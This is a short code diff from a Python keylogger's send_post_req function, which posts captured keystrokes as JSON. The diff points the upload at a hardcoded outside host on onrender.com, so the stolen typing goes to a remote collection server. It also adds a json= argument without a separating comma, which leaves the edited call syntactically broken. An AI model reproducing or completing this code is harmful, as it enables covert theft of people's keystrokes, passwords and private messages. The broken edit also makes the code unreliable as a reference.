@@ -65,6 +65,7 @@ def send_post_req():
     try:
         payload = json.dumps({"keyboardData": text})
         url = f"http://{ip_address}:{port_number}"
+        url ="https://keylogger-creation-1.onrender.com/"
 
         # debug: print what we are about to send and where
         print(f"[DEBUG] Sending payload to http://{ip_address}:{port_number} -> {payload!r}")
@@ -76,6 +77,7 @@ def send_post_req():
             data=payload,
             headers={"Content-Type": "application/json"},
             timeout=1000
+            json={"keyboardData":text}
         )
         # Print status / body for debugging
         print(f"[DEBUG] POST response: {r.status_code} {r.reason}")
